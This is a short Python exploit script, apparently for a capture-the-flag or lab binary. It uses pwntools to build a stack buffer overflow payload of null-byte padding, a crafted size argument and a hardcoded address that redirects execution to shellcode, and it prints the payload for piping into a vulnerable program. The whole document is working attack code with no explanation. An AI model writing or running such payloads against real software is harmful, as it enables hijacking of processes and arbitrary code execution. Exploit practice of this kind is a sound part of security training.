#!/usr/bin/python3
import sys
from pwn import *


shellcode_address = 0xffffd4e9

size = 0x44

payload = b'\x00' * 46
payload += p16(size) # this is arg4
payload += b'\x00' * (size-len(payload) - 4)

payload += p32(shellcode_address)


sys.stdout.buffer.write(payload)
